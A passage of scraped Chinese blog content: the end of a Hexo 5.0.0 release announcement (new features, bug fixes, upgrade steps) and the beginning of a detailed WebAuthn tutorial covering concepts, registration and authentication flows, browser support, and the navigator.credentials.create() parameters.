字段外第三种配置主题的方式。</li>\n<li>为保证向后兼容性，Hexo 会按照如下优先级 deep merge 三份主题配置：<code>站点配置文件的 theme_config 字段 &gt; 站点根目录下的 _config.[主题的名称].yml &gt; 主题目录下的 _config.yml</code>。因此，我们建议主题开发者尽量限制配置文件层级为 1 级，避免在 deep merge 时更深层级的配置项会被合并而不是被覆盖。</li>\n</ul>\n<h3>PrismJS 代码高亮支持</h3>\n<p>Hexo 5.0.0 新增了 PrismJS 代码高亮支持。</p>\n<p>相比 highlight.js 可以在 Node.js 环境执行（即：可在 Hexo 生成页面时进行代码高亮）不同，PrismJS 是一个轻量级的代码高亮库，绝大部分插件都依赖浏览器中执行。Hexo 为了尽可能兼容 PrismJS 的功能和插件，提供了「生成时渲染」和「浏览器渲染」两种模式：前者只需在主题之中引入 PrismJS 的 CSS 即可，但是无法使用大部分 PrismJS 的插件；后者需要在主题中同时引入 PrismJS 的 CSS 和 <code>prism.js</code>，但是可以兼容 PrismJS 大部分插件。</p>\n<p>关于 Hexo 主题的开发者适配 Hexo 的两种代码高亮的技术细节，我们专门撰写了 <a href=\"https://hexo.io/docs/syntax-highlight\">相关的文档页面</a> 以供参考。</p>\n<h3>静态 HTML 片段插入</h3>\n<p>插件开发者经常需要在页面中插入 HTML 片段：播放器插件需要往页面中插入 <code>player.css</code> 和 <code>player.js</code>，lazyload 插件的作者需要往页面中插入 <code>lazyload.js</code>，Live2D 插件的作者需要往页面中插入对应的 CSS 和 JS，等等。Hexo 5.0.0 新增了一个插件 API 接口 <code>Injector</code>，用于往页面的 <code>&lt;head&gt;</code> 和 <code>&lt;body&gt;</code> 标签中注入静态 HTML 片段。这一功能支持：</p>\n<ul>\n<li>在 <code>&lt;head&gt;</code> 之后、<code>&lt;/head&gt;</code> 之前、<code>&lt;body&gt;</code> 之后 和 <code>&lt;/body&gt;</code> 之前四个位置插入代码。</li>\n<li>支持只在特定页面注入 HTML 片段 —— 插件开发者可以仅往文章页面插入 HTML 片段而不影响其他页面如首页和归档。</li>\n</ul>\n<p>插件开发者请参考 Hexo 的 [Injector API 文档] 了解具体使用方法。</p>\n<h3>其他新特性</h3>\n<p>除上述三个重磅功能外，Hexo 还新增了其他功能，如：</p>\n<ul>\n<li>标签插件 API 新增 <code>unregister</code>å 方法</li>\n<li>\n<code>tagcloud</code> 辅助函数新增支持自定义 class 属性和 level</li>\n<li>\n<code>feed_tag</code> 辅助函数增加对 hexo-generator-feed 插件的兼容</li>\n<li>\n<code>youtube</code> 标签插件新增对 YouTube 播放列表的支持，以及可选使用 <code>www.youtube-nocookie.com</code> 域名</li>\n<li>\n<code>post_link</code> 标签插件在找不到对应文章时将会显示警告信息</li>\n<li>\n<code>post_permalink</code> 配置项新增支持 <code>:second</code> 属性</li>\n<li>当文章的标签插件出现渲染错误时，报错信息将会显示出错文件的路径</li>\n</ul>\n<h2>修复的 Bug</h2>\n<ul>\n<li>修复了 数个相邻的标签插件 无法渲染的 Bug</li>\n<li>修复了 文章中的代码块由于包含大括号（<code>{</code> 和 <code>}</code>）导致的渲染失败</li>\n<li>修复了 包含 Source Map 的 Hexo 插件无法加载的 Bug</li>\n<li>修复了 <code>code</code> 标签插件无法解析 <code>wrap</code> 选项的问题</li>\n<li>当 <code>post_asset_folder</code> 功能启用时，<code>hexo new</code> 命令将不再生成错误的 <code>index</code> 目录</li>\n</ul>\n<h2>性能改进</h2>\n<p>一如既往，Hexo 5.0.0 也带来了一系列性能改进，以提升 Hexo 的渲染性能。</p>\n<ul>\n<li>改进了标签插件的渲染性能</li>\n<li>优化了 <code>meta[generator]</code> 标签注入的逻辑</li>\n<li>优化为外部链接添加 <code>rel=noopenner</code> 和 <code>target=\"_blank\"</code> 功能的性能</li>\n<li>确保 <code>after_render:html</code> Filter 在每个页面只执行一次</li>\n<li>优化了 Filter API 的执行速度</li>\n<li>延迟加载代码高亮，减少 Hexo 启动用时</li>\n<li>当执行 <code>hexo clean</code> 时不再加载无关的插件</li>\n</ul>\n<h2>从 Hexo 4.x 升级到 Hexo 5.x</h2>\n<p>Hexo 5.0.0 引入了少数不向后兼容的功能，因此当你升级到 Hexo 5.0.0 时，需要遵循以下步骤进行迁移：</p>\n<h3>升级 Node.js</h3>\n<p>Hexo 5.0.0 不再支持 Node.js 8 及更低版本。为了使用 Hexo 5.0.0，请确保 Node.js 版本不低于 10.13.0。</p>\n<h3>文章 Front-Matter 不再支持 keywords 字段</h3>\n<p>过去这一字段被主要用于 <code>open_graph</code> 辅助函数。升级到 Hexo 5.0.0 后你无需去除现有文章的 Front-Matter 中的 <code>keywords</code> 字段，但这一字段将不会再起任何作用。</p>\n<h3>文章 Front-Matter 中 permalink 字段的行为</h3>\n<p>Hexo 5.0.0 修改了在文章的 Front Matter 中指定 <code>permalink</code> 字段的行为，与独立页面的 <code>permalink</code> 的行为一致。</p>\n<h3>全局变量中不再包含 Lodash</h3>\n<p>Hexo 5.0.0 去除了全局变量中的 Lodash，因此主题无法继续在模板中使用 Lodash。主题开发者应该遵循 <a href=\"https://github.com/you-dont-need/You-Dont-Need-Lodash-Underscore\">You-Dont-Need-Lodash-Underscore</a> 进行迁移。</p>\n<h3>用 updated_option 配置代替 use_date_for_updated</h3>\n<p>Hexo 4.0.0 提供的 <code>use_date_for_updated</code> 配置项现已被 <code>updated_option</code> 替代。</p>\n<ul>\n<li>\n<code>use_date_for_updated: true</code> 现在等价于 <code>updated_option: 'date'</code>。</li>\n<li>\n<code>use_date_for_updated: false</code> 现在等价于 <code>updated_option: 'mtime'</code>。</li>\n</ul>\n<div class=\"license\"> <div class=\"license-title\">Hexo 5.0.0 正式发布</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hexo-5/\">https://blog.skk.moe/post/hexo-5/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-07-24</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hexo-5/"},{"title":"谈谈 WebAuthn","date":"2020-03-23 14:57:59","description":"\n<p>WebAuthn，即 Web Authentication，是一个用于在浏览器上进行认证的 API，W3C 将其表述为 “An API for accessing Public Key Credentials”，即“一个用于访问公钥凭证的 API”。WebAuthn 很强大，强大到被认为是 Web 身份认证的未来（当然，也很复杂）。你有想过通过指纹或者面部识别来登录网站吗？WebAuthn 就能在保证安全和隐私的情况下让这样的想法成为现实。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/wwa.gif\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/wwa.gif?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"通过 WebAuthn 调起 Windows Hello 登录网站\" width=\"1912\" height=\"966\" class=\"aligncenter size-full wp-image-2215\"></a>\n<p>你可以在<a href=\"https://webauthn.io/\" rel=\"noopener\">这个网站</a>自行体验 WebAuthn。或者，如果你有一个使用 WordPress 的站点，可以尝试一下 <a href=\"https://wordpress.org/plugins/wp-webauthn/\">WP-WebAuthn</a> 这款插件，它可以为你的站点启用 WebAuthn 登录。这是我为了写这篇文章而练手开发的插件，本文中的部分示例代码也来自这款插件。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"wp-webauthn\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/wp-webauthn\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<p>WebAuthn Level 1 标准已在 2019 年 3 月成为 W3C 推荐标准，而 Level 2 标准目前也已进入编辑草案阶段，但互联网上有关它的中文资料却仍然很少，国内也鲜有网站支持这一新标准。于是，在抱着各种英文资料和标准啃了几天以后，我折腾出了这篇文章。</p>\n<p>在这篇文章里，我将会从最基本的概念开始，逐渐深入 WebAuthn，直到解码公钥等深层细节。这可能是你能找到的有关 WebAuthn 最详细最基础的中文文章，也很可能是最长的。在开始之前，<strong>我强烈建议你打开菜单中的文章目录浏览一遍，以对这篇文章涉及的内容有所了解。</strong>如果你只是想了解如何简单地在你的项目中添加对 WebAuthn 的支持，那么“<a href=\"https://flyhigher.top/#webauthn-overview\">浅谈 WebAuthn</a>”部分就是你要找的；如果你想了解更多关于 WebAuthn 的底层细节，那么你可以继续阅读“<a href=\"https://flyhigher.top/#deep-into-webauthn\">深入了解 WebAuthn</a>”部分。</p>\n<p>由于在本文写作时 WebAuthn Level 2 规范尚未定稿，<strong>这篇文章我们将只专注于 Level 1 规范。</strong></p>\n<p>这篇文章最后更新于 2020.9 ，在你读到这篇文章时，部分事实可能已经发生改变，请注意判断。</p>\n<p><strong>更新日志：</strong></p>\n<ul>\n<li>2021.1.16 添加 Chrome 开发工具信息</li>\n<li>2020.9.17 更新 iOS/iPad OS 兼容性信息</li>\n<li>2020.5.20 添加部分无用户名认证的平台兼容性内容</li>\n<li>2020.5.15 添加部分 <code>extensions</code> 相关内容与链接；添加全局凭证 ID 唯一内容；添加凭证 ID 查找相关内容；添加“从 U2F 认证迁移”一节</li>\n<li>2020.4.13 更新与修正 <code>userVerification</code> 相关内容；添加部分 Firefox 相关内容</li>\n<li>2020.3.23 文章发布</li>\n</ul>\n<p>那么让我们开始吧。<span></span></p>\n<h1>浅谈 WebAuthn</h1>\n<p>在这个部分里，我们将会从基础概念开始，了解有关 WebAuthn 和密码学的一些基础知识，并最终使用第三方库实现基础的 WebAuthn 认证。如果你已经对这些内容有所了解了，可以跳到“<a href=\"https://flyhigher.top/#deep-into-webauthn\">深入了解 WebAuthn</a>”继续阅读。</p>\n<h2>为什么使用 WebAuthn</h2>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/2.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/2.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"钓鱼邮件\" width=\"709\" height=\"693\" class=\"aligncenter size-full wp-image-2162\"></a>\n<p>相信你一定收到过类似的邮件吧？只要你点进那个最显眼的链接，你就会进入一个设置好的圈套——钓鱼网站。如果你一时糊涂在这类网站上填写了你的账号和密码，bingo，你的账号就不再是你的账号了。</p>\n<p>不过，就算你警惕心再强，也无法避免密码泄露事件。Twitter, Facebook 等都爆出过明文密码泄露事件，证明再大的公司或组织也无法避免密码泄露问题。雪上加霜的是，很大一部分用户都非常喜欢使用重复密码，这就导致一次密码泄露会牵连很多网站，用户的账户安全性完全无法得到保证。</p>\n<p>那么，有什么办法解决这些问题吗？<strong>彻底解决的方法只有一个，那就是抛弃密码。</strong>可是没有密码还怎么验证用户身份呢？这就是 WebAuthn 的用武之地了。</p>\n<p><del>没有密码的好时代，来临力！</del></p>\n<h2>什么是 WebAuthn</h2>\n<p>那么到底什么是 WebAuthn 呢？如开头所说，WebAuthn 是“一个用于访问公钥凭证的 API”，网站可以通过这个 API 进行一些高安全性的身份验证。WebAuthn 一个最常见的应用就是用于网站登录时的 2FA（双重因素验证）甚至是无密码登录。通过网页调用 WebAuthn，在不同平台下，<strong>我们可以实现通过 USB Key、指纹、面部甚至虹膜扫描来认证身份，同时确保安全和隐私。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/4-3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/4-3.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"WebAuthn 可使用的各种身份认证方式\" width=\"1294\" height=\"566\" class=\"aligncenter size-full wp-image-2213\"></a>\n<p>WebAuthn 标准是 FIDO2 标准的一部分，而 FIDO2 则是由 FIDO 联盟和 W3C 共同推出的 U2F（现称作 FIDO1）的后继标准，旨在增强网络认证的安全性。</p>\n<blockquote><p>你可能了解过 U2F，那么 U2F 和 FIDO2 的区别在哪里呢？从名字上可以看出，U2F，即“通用第二因素协议”，是专注于作为密码后的第二道屏障的，而 FIDO2 增加了单因素认证功能，这意味着使用 FIDO2 可以完全替代密码，真正实现无密码登录。</p></blockquote>\n<p>FIDO2 标准主要包括四个部分，其一是用于网站和访客设备交互的 WebAuthn，而 Client to Authenticator Protocol 2（CTAP2，客户端-认证器协议）作为 WebAuthn 的补充，则是用于访客的设备和认证器交互的协议。标准的其他两个部分则是 U2F 和 UAF 规范。在这篇文章中，我们只关心 WebAuthn，不会涉及 CTAP, U2F 和 UAF 的相关知识。如果你对这段话中的一些概念不了解，不要紧张，接下来我们就来谈谈 WebAuthn 中一些常用的术语和概念。</p>\n<blockquote><p>WebAuthn 只能在安全上下文中使用，也就是说，页面需要使用 HTTPS 协议或是处于 <code>localhost</code> 中。</p></blockquote>\n<h2>常用术语和概念</h2>\n<p>WebAuthn 中有许多不常碰到的术语，不过我只会在这里介绍一些常用的术语和概念——如果你只是希望做出一个简单的实现，那么了解这一段中的一些概念就足够了。同时，由于我实在没能找到一部分术语的通用翻译，有一些术语我按着自己的理解尽可能地翻译了，有任何问题请告诉我。</p>\n<p>在一个完整的 WebAuthn 认证流程中，通常有这么几个角色：</p>\n<ul>\n<li>Relying Party 依赖方 (RP) ：指服务提供方，即网站</li>\n<li>User 用户：正准备登录的你</li>\n<li>Authenticator 认证器：通常指 USB Key 或是设备内置的指纹扫描器、虹膜扫描器、面部识别装置等，正是它们在使用流程中代替了密码甚至是用户名</li>\n<li>User Agent 用户代理：通常指浏览器或系统，负责与认证器交互</li>\n</ul>\n<p>认证过程通常分为两种：</p>\n<ul>\n<li>Registration Ceremony 注册仪式：用户向账户上添加认证器</li>\n<li>Authentication Ceremony 验证仪式：用户通过已注册的认证器验证身份</li>\n</ul>\n<p>同时，认证过程中还会产生这些内容：</p>\n<ul>\n<li>Challenge 挑战：通常是一串随机字符串</li>\n<li>Public Key Credential 公钥凭证：由认证器产生的凭证，在技术上代替了密码</li>\n<li>Attestation 证明：注册时认证器产生的验证数据</li>\n<li>Assertion 断言：验证时认证器产生的验证数据</li>\n</ul>\n<blockquote><p><strong>请注意区分证明 (Attestation) 和断言 (Assertion)</strong>，特别是在这两个单词有些相似的情况下。在 WebAuthn 中，它们是不同过程中的类似概念，但并不相同。</p></blockquote>\n<p>如果你对于这些内容不是很理解，没有关系，我们会在“<a href=\"https://flyhigher.top/#how-to-webauthn\">使用流程</a>”一节中将这些概念放到实际情况中解释，你只要先区分这些概念即可。</p>\n<h2>安全性的基础</h2>\n<p>WebAuthn 为什么安全？和 HTTPS 一样，WebAuthn 使用非对称加密的思路来保证安全性，但侧重点又有所不同。要理解 WebAuthn 的认证流程，我们必须对非对称加密有所了解。如果你对非对称加密比较熟悉了，就直接跳到下一段吧。</p>\n<p>WebAuthn 的核心在于“认证”，即保证产生了凭证的认证器是用户的认证器，而不是第三方在伪造凭证。但为什么要使用非对称加密呢？我们可以先来看看对称加密。</p>\n<p>让我们假设小明和小红相互写信，见不到对方。这天小红突然想，给自己写信的人是不是真的小明呢？于是小红要求对方向小红证明自己是小明。怎么证明呢？他们商量出来这么一套方案：</p>\n<ol>\n<li>在小明的身份已经验证的情况下，小明和小红商量一个统一的密码和密钥</li>\n<li>一段时间后，在小红要求小明验证身份时，小红发送一段文本给小明</li>\n<li>小明用提前和小红商量好的密码和密钥加密文本后发回给小红</li>\n<li>小红使用相同的密码和密钥解密文本，如果得到文本和之前发送的一致，就表明对方拥有正确的密码和密钥</li>\n</ol>\n<blockquote><p>在密码学中，我们通常把“加密算法”称为密码 (code)，和通常登录时用的密码 (password) 并非同一个概念。</p></blockquote>\n<p>在这种情况下，<strong>只要密钥不泄露</strong>，即拥有正确密钥的只有小明和小红，那么小红就能确定对方一定是小明。但这样的问题也很明显，如果小明和小红不能见面，那么他们就必须先以明文交换密码——<strong>在这个过程中一旦有人窃取到了密码，这个认证就无效了。</strong></p>\n<p>这时我们就需要使用<strong>非对称加密</strong>来拯救破碎的信任了。非对称加密的基础是一对密钥，也就是公钥和私钥，它们是互相关联但（几乎）无法互相推导的。在非对称加密的过程中，选择相同的密码后，使用私钥加密明文得到的密文只能由对应的公钥解密，无法使用私钥解密，同时这个过程反过来也是成立的。</p>\n<blockquote><p>本文的核心并不是非对称加密算法，因此不会详述非对称加密在数学上的证明，若有兴趣可以自行了解。</p></blockquote>\n<p>这就完美解决密钥泄露的问题了。让我们回过头来看之前的例子。现在小明和小红决定使用非对称加密来证明身份，过程如下：</p>\n<ol>\n<li>在小明的身份已经验证的情况下，小明提前生成一对公私钥，将公钥发送给小红，私钥自己保管，同时商量好统一的密码</li>\n<li>一段时间后，在小红要求小明验证身份时，小红发送一段文本给小明</li>\n<li>小明使用商量好的密码和自己的私钥加密文本，发送给小红</li>\n<li>小红使用相同的密码和小明的公钥解密文本，如果得到文本和之前发送的一致，就表明对方拥有正确的密码和私钥</li>\n</ol>\n<p>在这种情况下，<strong>只要私钥不泄露</strong>，那么小红解密得到的文本和之前发送的一致，那么就可以证明收到的密文一定是由小明加密后发送过来的。而在整个过程中，私钥都没有离开过小明，更没有经过传输，也就几乎没有泄露的可能了。这时，小红终于可以确定对面和她通信的人的确是小明了。</p>\n<p>题外话：HTTPS 虽然也应用了非对称加密，但 HTTPS 更侧重于“加密”而非“认证”，因此思路上会有些许差异。要了解关于 HTTPS 和非对称加密的更多信息，你可以阅读我之前写的这篇文章：</p>\n<p></p>\n<div class=\"mdx-post-cot\" data-mdxposturl=\"https://flyhigher.top/develop/1093.html\"><div class=\"mdx-post-wait-out-c2\"><div class=\"mdx-post-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://flyhigher.top/develop/1093.html\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<span></span>\n<h2>使用流程</h2>\n<p>了解了非对称加密，我们就可以来看看 WebAuthn 的认证流程了。</p>\n<p>和普通的密码一样，<strong>使用 WebAuthn 分为两个部分，注册和验证。</strong>注册仪式会在依赖方中将认证器的一些信息和用户建立关联；而验证仪式则是验证这些信息以登确保是用户本人在登录。根据上一节的思路，我们可以知道，注册仪式就是认证器生成一对公私钥，然后将公钥交给依赖方；而验证仪式是依赖方发送给认证器一段文本，要求认证器用自己的私钥加密后发回以验证。</p>\n<p>在实际情况中，WebAuthn 是基于<strong>挑战-应答模型</strong>工作的。要更好地理解，我们直接来看具体流程。先来看看注册的流程。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc1.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc1.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"WebAuthn 注册流程\" width=\"1100\" height=\"604\" class=\"aligncenter size-full wp-image-2224\"></a>\n<ol>\n<li>浏览器向依赖方发送某个用户的注册请求</li>\n<li>依赖方向浏览器发送挑战、依赖方信息和用户信息</li>\n<li>浏览器向认证器发送挑战、依赖方信息、用户信息和客户端信息以请求创建公钥凭证</li>\n<li>认证器请求用户动作，随后创建一对公私钥，并使用私钥签名挑战（即证明），和公钥一起交给浏览器</li>\n<li>浏览器将签名后的挑战和公钥发送给依赖方</li>\n<li>依赖方用公钥验证挑战是否与发送的一致，如果成功则将公钥与用户绑定，注册完成</li>\n</ol>\n<p>我也做了一个交互式的 Demo，你可以对照流程来更好地理解。</p>\n<p><button class=\"mdui-btn mdui-btn-raised mdui-ripple mdui-color-theme-accent\">开始注册</button> <span></span></p>\n<div></div>\n<blockquote><p>注意，这个 Demo 和下方的 Demo 都只是一个本地模拟的简单示例，没有任何数据会被上传，当然也不会对数据进行验证。</p></blockquote>\n<p>而之后的验证流程如下：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc2.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc2.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"WebAuthn 验证流程\" width=\"1100\" height=\"604\" class=\"aligncenter size-full wp-image-2226\"></a>\n<ol>\n<li>浏览器向依赖方发送某个用户的验证请求</li>\n<li>依赖方向浏览器发送挑战</li>\n<li>浏览器向认证器发送挑战、依赖方信息和客户端信息以请求获取公钥凭证</li>\n<li>认证器请求用户动作，随后通过依赖方信息找到对应私钥，并使用私钥签名挑战（即断言），交给浏览器</li>\n<li>浏览器将签名后的挑战发送给依赖方</li>\n<li>依赖方用之前存储的公钥验证挑战是否与发送的一致，一致则验证成功</li>\n</ol>\n<p><button class=\"mdui-btn mdui-btn-raised mdui-ripple mdui-color-theme-accent\" disabled>开始验证</button> <span>在上方注册后才能验证</span></p>\n<div></div>\n<p>可以看到，WebAuthn 不仅在理论上是安全的，同时<strong>在整个过程中并没有隐私数据被传输</strong>——用户信息实际上只包含用户名和用户 ID。因此我们完全可以说 WebAuthn 是安全且私密的。</p>\n<blockquote><p>为了避免用户在不同依赖方之间被追踪，认证器通常会为每个依赖方和用户的组合都创建一对公私钥。不过，由于认证器的存储空间有限，认证器通常不会存储每一个私钥，而是会通过各类信息和烧录在认证器内的主密钥“算”出对应的私钥以实现无限对公私钥。具体算法根据不同厂商会有所不同。对于 Yubikey，你可以在<a href=\"https://developers.yubico.com/U2F/Protocol_details/Key_generation.html\">这里</a>了解更多。</p></blockquote>\n<blockquote><p>如果依赖方需要，用户同意后，发送给依赖方的公钥凭证中可以包含用于辨认认证器型号的信息，不过这对隐私的影响微乎其微。</p></blockquote>\n<h2>浏览器接口</h2>\n<p>要使用 WebAuthn，我们必须要依靠浏览器作为媒介和验证器进行交互，而这就需要浏览器对于 WebAuthn 的支持了。绝大多数新版本的现代浏览器都为 WebAuthn 提供了统一的接口，而在这一段中我们会了解如何使用相关的接口。但是在开始之前，我们可以先来看看浏览器的支持程度（2020.9）。</p>\n<div class=\"mdui-table-fluid\"><table class=\"mdui-table\">\n<thead><tr>\n<th>浏览器</th>\n<th>支持情况</th>\n</tr></thead>\n<tbody>\n<tr>\n<td>桌面端 Chrome</td>\n<td>67+</td>\n</tr>\n<tr>\n<td>移动端 Chrome</td>\n<td>67+<sup>[1]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Firefox</td>\n<td>60+</td>\n</tr>\n<tr>\n<td>移动端 Firefox</td>\n<td>不支持<sup>[2]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Edge</td>\n<td>18+</td>\n</tr>\n<tr>\n<td>移动端 Edge</td>\n<td>不支持<sup>[3]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Safari</td>\n<td>13+</td>\n</tr>\n<tr>\n<td>移动端 Safari</td>\n<td>13.3+<sup>[4]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Opera</td>\n<td>54+</td>\n</tr>\n<tr>\n<td>移动端 Opera</td>\n<td>不支持</td>\n</tr>\n</tbody>\n</table></div>\n<p><sup>[1]</sup> 受平台限制，Chrome 在 iOS 平台上不支持 WebAuthn，在 Android 平台上支持大部分 WebAuthn 功能，但仍不支持部分特性（如 <code>userVerification</code>）。<br><sup>[2]</sup> 移动端 Firefox 80 以下的版本支持 WebAuthn 但似乎会忽略 <code>authenticatorAttachment</code> 等一部分参数，同时移动端 Firefox Beta 80 以下的版本支持 WebAuthn 但无法成功调用。自 80 版本起移动端 Firefox 暂时取消了对 WebAuthn 的支持（可能是 Bug）。<br><sup>[3]</sup> 移动端 Edge 似乎支持 WebAuthn 但无法成功调用。<br><sup>[4]</sup> Safari iOS/iPad OS 13 仅支持外部认证器，无法调用 Touch ID 或 Face ID；自 iOS/iPad OS 14 起 Safari 已支持全功能 WebAuthn，可以调用 Touch ID/Face ID</p>\n<p>当然，一众国产浏览器，包括 Samsung Browser 和 Yandex Browser，目前都不支持 WebAuthn。此外，由于 WebAuthn 涉及外部验证器和 TPM 可信平台模块等，用户的操作系统也会对 WebAuthn 的可用性造成影响。以下是一些需要注意的信息：</p>\n<ul>\n<li>Windows 10 1903 以下版本仅 Edge 能提供完整支持，其他浏览器只能使用 USB Key 等外部认证器；1903+ 中所有浏览器都可以通过 Windows Hello 带来完整的 WebAuthn 支持</li>\n<li>Android 需要安装并开启 Google 服务</li>\n<li>iOS/iPad OS 13.3 以下的版本不支持 WebAuthn，iOS/iPad OS 14 以下的版本支持有限（参考上文），iOS/iPad OS 14 开始 Safari 已支持全功能 WebAuthn（功能完整度甚至超过了 Android）</li>\n</ul>\n<p>可以看出，WebAuthn 的发展之路仍然很漫长，但好在桌面端对它的支持已经比较完善了，在一些情况下我们完全有理由使用它。</p>\n<hr>\n<p>来看看浏览器提供了怎么样的接口吧。要使用 WebAuthn，我们可以使用 <code>navigator.credentials.create()</code> 请求认证器生成公钥凭证和 <code>navigator.credentials.get()</code> 请求获取公钥凭证。</p>\n<blockquote><p>你或许已经对 Credential Management API 有所了解了。通过这些 API，我们还可以实现一些有趣的特性，不过这值得另开一篇文章来讲了。</p></blockquote>\n<p>对于一个基础的实现，<code>navigator.credentials.create()</code> 需要传入的参数如下：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.create({\r\n    publicKey: {\r\n        challenge,\r\n        rp: {\r\n            id,\r\n            name\r\n        },\r\n        user: {\r\n            id,\r\n            name,\r\n            displayName\r\n        },\r\n        pubKeyCredParams: [\r\n            {\r\n                type: \"public-key\",\r\n                alg\r\n            }\r\n        ],\r\n        authenticatorSelection: {\r\n            authenticatorAttachment,\r\n            userVerification\r\n        },\r\n        excludeCredentials: [\r\n            {\r\n                id,\r\n                transports: [],\r\n                type: \"public-key\"\r\n            }\r\n        ],\r\n        timeout\r\n    }\r\n})</pre>\n<p>在 <code>navigator.credentials.create()</code> 方法中，我们必须传入一个对象，其中只有一对名为 <code>publicKey</code> 的键值。这指明了我们需要创建公钥凭证，而非普通的密码凭证。然后，在 <code>publicKey</code> 对象中设置这些常用参数：</p>\n<ul>\n<li>\n<code>challenge: Uint8Array</code>：转换为 <code>Uint8Array</code> 的挑战，长度至少为 16，建议为 32</li>\n<li>\n<code>rp: Object</code>：依赖方信息，其中有一项为必须：\n<ul>\n<li>\n<code>rp.id: String</code>：（可选）依赖方 ID，必须为当前域名或为当前域名的子集的域名（不是子域名）。如域名为 <code>test.123.example.com</code>，则依赖方 ID 可以是 <code>test.123.example.com</code>, <code>123.example.com</code> 或 <code>example.com</code>。不指定则默认使用当前域名</li>\n<li>\n<code>rp.name: String</code>：依赖方名称，用于方便用户辨认</li>\n</ul>\n</li>\n<li>\n<code>user: Object</code>：用户信息，其中有三项为必须：\n<ul>\n<li>\n<code>user.id: Uint8Array</code>：转换为 <code>Uint8Array</code> 的字符串。<strong>出于安全考量，这应尽可能不与任何用户信息相关联，如不要包含用户名、用户邮箱等</strong>\n</li>\n<li>\n<code>user.name: String</code>：登录用户名</li>\n<li>\n<code>user.dispalyName: String</code>：用于显示的用户名称，显示与否的具体行为取决于浏览器</li>\n</ul>\n</li>\n<li>\n<code>pubKeyCredParams: Array</code>：一个算法列表，指明依赖方接受哪些签名算法。列表的每一项都是一个对象，拥有两个属性：\n<ul>\n<li>\n<code>pubKeyCredParams[].type: String</code>：值只能为 “public-key”</li>\n<li>\n<code>pubKeyCredParams[].alg: Number</code>：一个负整数，用于标明算法。具体算法对应的数字可以在 <a href=\"https://www.iana.org/assignments/cose/cose.xhtml#algorithms\">COSE</a> 找到</li>\n</ul>\n</li>\n<li>\n<code>authenticatorSelection: Object</code>：（可选）用于过滤正确的认证器，这里介绍常用的一个参数：\n<ul>\n<li>\n<code>authenticatorSelection.authenticatorAttachment: String</code>：（可选）指定要求的认证器类型。如果没有满足要求的认证器，认证可能会失败。该参数可以为 <code>null</code>（表示接受所有类型的认证器）或是以下两个值之一：\n<ul>\n<li>\n<code>platform</code>：表示仅接受平台内置的、无法移除的认证器，如手机的指纹识别设备</li>\n<li>\n<code>cross-platform</code>：表示仅接受外部认证器，如 USB Key</li>\n</ul>\n</li>\n<li>\n<code>authenticatorSelection.userVerification: String</code>：（可选）指定认证器是否需要验证“用户为本人 (User Verified, UV)”，否则只须“用户在场 (User Present, UP)”。具体验证过程取决于认证器（不同认证器的认证方法不同，也有认证器不支持用户验证），而对验证结果的处理情况则取决于依赖方。该参数可以为以下三个值之一：\n<ul>\n<li>\n<code>required</code>：依赖方要求用户验证</li>\n<li>\n<code>preferred</code>：（默认）依赖方希望有用户验证，但也接受用户在场的结果</li>\n<li>\n<code>discouraged</code>：依赖方不关心用户验证。对于 iOS/iPad OS 13，必须设置为此值，否则验证将失败</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<code>excludeCredentials: Array</code>：（可选）用于标识要排除的凭证，可以避免同一个用户多次注册同一个认证器。如果用户试图注册相同的认证器，用户代理会抛出 <code>InvalidStateError</code> 错误。数组中的每一项都是一个公钥凭证对象，包含以下属性：\n<ul>\n<li>\n<code>excludeCredentials[].type: String</code>：值只能为 “public-key”</li>\n<li>\n<code>excludeCredentials[].id: Uint8Array</code>：要排除的凭证 ID</li>\n<li>\n<code>excludeCredentials[].transports: Array</code>：（可选）用于指定该凭证所需的认证器与用户代理的通信方式，可以包含以下的一或多个字符串：\n<ul>\n<li>\n<code>usb</code>：可以通过 USB 连接的认证器</li>\n<li>\n<code>nfc</code>：可以通过 